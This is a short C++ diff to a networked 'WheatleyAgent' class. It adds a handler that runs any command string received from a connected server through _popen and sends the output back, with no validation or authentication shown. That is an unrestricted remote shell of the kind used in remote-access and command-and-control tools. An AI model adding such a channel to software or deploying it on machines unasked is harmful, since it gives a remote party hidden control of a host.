@@ -39,6 +39,13 @@ agent::command::Response WheatleyAgent::processCommandRequest(agent::command::Re
         break;
     }
 
+    // Command execution handler
+    case agent::command::Request::kExecute: {
+        auto output = handleExecute(request.execute().command());
+        response.mutable_execute()->set_output(output);
+        break;
+    }
+
     case agent::command::Request::REQUEST_NOT_SET:
     default:
         throw std::runtime_error("Request type not set.");
@@ -53,4 +60,19 @@ void WheatleyAgent::sendCommandResponse(agent::command::Response response)
 		throw std::runtime_error("Agent is not connected to a server.");
 	}
 	m_connection->sendProtobuf(response);
+}
+
+std::string WheatleyAgent::handleExecute(const std::string &command)
+{
+    std::array<char, 128> buffer;
+    std::string result;
+    auto pipe = _popen(command.c_str(), "r");
+    if (!pipe) {
+        return "Error: Failed to open pipe for command execution.";
+    }
+    while (fgets(buffer.data(), buffer.size(), pipe) != nullptr) {
+        result += buffer.data();
+    }
+    _pclose(pipe);
+    return result;
 }
